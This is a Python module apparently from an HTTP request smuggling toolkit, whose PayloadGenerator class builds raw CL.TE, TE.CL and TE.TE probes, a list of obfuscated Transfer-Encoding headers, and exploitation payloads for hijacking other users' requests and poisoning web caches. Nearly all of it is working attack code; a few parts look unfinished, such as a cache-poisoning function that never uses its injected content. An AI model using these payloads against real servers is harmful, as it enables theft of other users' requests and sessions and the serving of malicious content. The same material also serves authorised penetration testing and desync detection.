"""
Payload Generator

Generates HTTP request smuggling payloads for various techniques.
Includes both detection payloads and exploitation payloads.
"""

from typing import Optional, Dict, List
from dataclasses import dataclass


@dataclass
class Payload:
    """Container for generated payload"""
    raw: str                    # Raw payload string
    technique: str              # Technique type
    purpose: str                # detection/exploit
    description: str            # What this payload does
    expected_behavior: str      # What to look for in response


class PayloadGenerator:
    """
    Generates smuggling payloads for testing and exploitation.
    
    Supports:
    - CL.TE payloads
    - TE.CL payloads
    - TE.TE obfuscation payloads
    - Request hijacking payloads
    - Cache poisoning payloads
    
    Example:
        gen = PayloadGenerator("example.com")
        
        # Detection payload
        probe = gen.cl_te_timing_probe("/")
        
        # Exploitation payload
        hijack = gen.request_hijack_payload("/admin")
    """
    
    def __init__(self, host: str, port: int = None):
        """
        Initialize payload generator.
        
        Args:
            host: Target hostname
            port: Target port (optional)
        """
        self.host = host
        self.port = port
        self.host_header = f"{host}:{port}" if port else host
        
    # ==================== CL.TE PAYLOADS ====================
    
    def cl_te_timing_probe(self, path: str = "/") -> str:
        """
        Generate CL.TE timing-based detection payload.
        
        This payload exploits the difference when:
        - Front-end uses Content-Length (sees complete request)
        - Back-end uses Transfer-Encoding (waits for more chunks)
        
        If vulnerable, the back-end will timeout waiting for chunk terminator.
        
        Args:
            path: Request path
            
        Returns:
            Raw HTTP request string
        """
        # The trick: Content-Length includes the "1\r\n" which makes
        # the front-end think body is complete, but the back-end
        # interprets this as chunked and waits for "0\r\n\r\n"
        
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q"  # Incomplete - back-end will wait
        )
        
        return payload
    
    def cl_te_basic_probe(self, path: str = "/") -> str:
        """
        Simple CL.TE probe without timing dependency.
        
        Args:
            path: Request path
            
        Returns:
            Raw HTTP request string
        """
        body = "0\r\n\r\n"
        
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        )
        
        return payload
    
    def cl_te_smuggle_prefix(self, path: str = "/", smuggled_path: str = "/admin") -> str:
        """
        CL.TE payload that smuggles a request prefix.
        
        The smuggled prefix will be prepended to the next legitimate
        request through the connection.
        
        Args:
            path: Visible request path
            smuggled_path: Path for smuggled request
            
        Returns:
            Raw HTTP request string
        """
        # Smuggled request prefix (incomplete)
        smuggled = f"GET {smuggled_path} HTTP/1.1\r\nFoo: "
        
        # Encode in chunked format
        chunk_size = hex(len(smuggled))[2:]
        
        body = (
            f"0\r\n"
            f"\r\n"
            f"{smuggled}"
        )
        
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        )
        
        return payload
    
    # ==================== TE.CL PAYLOADS ====================
    
    def te_cl_timing_probe(self, path: str = "/") -> str:
        """
        Generate TE.CL timing-based detection payload.
        
        This exploits when:
        - Front-end uses Transfer-Encoding
        - Back-end uses Content-Length
        
        The chunked body contains more data than Content-Length indicates,
        causing desync.
        
        Args:
            path: Request path
            
        Returns:
            Raw HTTP request string
        """
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"  # Extra data - back-end will see as next request start
        )
        
        return payload
    
    def te_cl_smuggle_request(self, path: str = "/", smuggled_path: str = "/admin") -> str:
        """
        TE.CL payload that smuggles a complete request.
        
        Args:
            path: Visible request path
            smuggled_path: Path for smuggled request
            
        Returns:
            Raw HTTP request string
        """
        # The smuggled request
        smuggled = (
            f"GET {smuggled_path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Length: 10\r\n"
            f"\r\n"
            f"x="
        )
        
        # Encode as chunk
        chunk_size = hex(len(smuggled))[2:]
        
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunk_size}\r\n"
            f"{smuggled}\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        return payload
    
    # ==================== TE.TE PAYLOADS ====================
    
    def te_te_probe(self, path: str = "/", te_header: str = "Transfer-Encoding: chunked") -> str:
        """
        Generate TE.TE probe with obfuscated Transfer-Encoding.
        
        Various obfuscation techniques may cause one server to
        process TE while another ignores it.
        
        Args:
            path: Request path
            te_header: Custom/obfuscated TE header
            
        Returns:
            Raw HTTP request string
        """
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"{te_header}\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q"
        )
        
        return payload
    
    def te_te_variants(self, path: str = "/") -> List[str]:
        """
        Generate multiple TE.TE payloads with different obfuscations.
        
        Args:
            path: Request path
            
        Returns:
            List of payload strings
        """
        obfuscations = [
            "Transfer-Encoding: chunked",           # Standard
            "Transfer-Encoding : chunked",          # Space before colon
            "Transfer-Encoding:  chunked",          # Double space
            "Transfer-Encoding:\tchunked",          # Tab
            "Transfer-Encoding: chunked\r\n",       # Extra CRLF
            " Transfer-Encoding: chunked",          # Leading space
            "Transfer-Encoding: CHUNKED",           # Uppercase
            "Transfer-encoding: chunked",           # Lowercase header
            "Transfer-Encoding: chunked",           # Line continuation
            "Transfer-Encoding: something, chunked", # Multiple values
            "Transfer-Encoding: chunked, identity",  # With identity
        ]
        
        return [self.te_te_probe(path, te) for te in obfuscations]
    
    # ==================== EXPLOITATION PAYLOADS ====================
    
    def request_hijack_payload(
        self,
        technique: str = "cl-te",
        capture_path: str = "/capture",
        target_path: str = "/"
    ) -> str:
        """
        Generate request hijacking payload.
        
        This causes the victim's request to be captured by redirecting
        it to an attacker-controlled endpoint.
        
        Args:
            technique: cl-te or te-cl
            capture_path: Path to capture victim request
            target_path: Path victim request was intended for
            
        Returns:
            Raw HTTP request string
        """
        if technique == "cl-te":
            smuggled = (
                f"POST {capture_path} HTTP/1.1\r\n"
                f"Host: {self.host_header}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 200\r\n"
                f"\r\n"
                f"captured="
            )
            
            body = f"0\r\n\r\n{smuggled}"
            
            payload = (
                f"POST {target_path} HTTP/1.1\r\n"
                f"Host: {self.host_header}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            )
        else:
            # TE.CL version
            smuggled = (
                f"POST {capture_path} HTTP/1.1\r\n"
                f"Host: {self.host_header}\r\n"
                f"Content-Length: 200\r\n"
                f"\r\n"
                f"captured="
            )
            
            chunk_size = hex(len(smuggled))[2:]
            
            payload = (
                f"POST {target_path} HTTP/1.1\r\n"
                f"Host: {self.host_header}\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{chunk_size}\r\n"
                f"{smuggled}\r\n"
                f"0\r\n"
                f"\r\n"
            )
            
        return payload
    
    def cache_poison_payload(
        self,
        technique: str = "cl-te",
        poisoned_path: str = "/static/main.js",
        malicious_content: str = "alert('XSS')"
    ) -> str:
        """
        Generate cache poisoning payload.
        
        This attempts to poison the cache with malicious content
        for a specific path.
        
        Args:
            technique: cl-te or te-cl
            poisoned_path: Path to poison in cache
            malicious_content: Content to inject
            
        Returns:
            Raw HTTP request string
        """
        # Smuggled request that serves malicious content
        smuggled = (
            f"GET {poisoned_path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"X-Ignore: "
        )
        
        body = f"0\r\n\r\n{smuggled}"
        
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        )
        
        return payload
    
    # ==================== UTILITY METHODS ====================
    
    def custom_payload(
        self,
        method: str = "POST",
        path: str = "/",
        headers: Dict[str, str] = None,
        body: str = "",
        smuggled_request: str = ""
    ) -> str:
        """
        Generate a custom smuggling payload.
        
        Args:
            method: HTTP method
            path: Request path
            headers: Custom headers
            body: Request body
            smuggled_request: Request to smuggle
            
        Returns:
            Raw HTTP request string
        """
        if headers is None:
            headers = {}
            
        # Build request
        request = f"{method} {path} HTTP/1.1\r\n"
        
        # Add Host if not present
        if "Host" not in headers:
            headers["Host"] = self.host_header
            
        # Add headers
        for name, value in headers.items():
            request += f"{name}: {value}\r\n"
            
        request += "\r\n"
        
        # Add body and smuggled request
        if body:
            request += body
        if smuggled_request:
            request += smuggled_request
            
        return request
    
    def get_all_detection_payloads(self, path: str = "/") -> Dict[str, List[str]]:
        """
        Get all detection payloads organized by technique.
        
        Args:
            path: Request path
            
        Returns:
            Dictionary mapping technique to list of payloads
        """
        return {
            "cl-te": [
                self.cl_te_timing_probe(path),
                self.cl_te_basic_probe(path)
            ],
            "te-cl": [
                self.te_cl_timing_probe(path)
            ],
            "te-te": self.te_te_variants(path)
        }
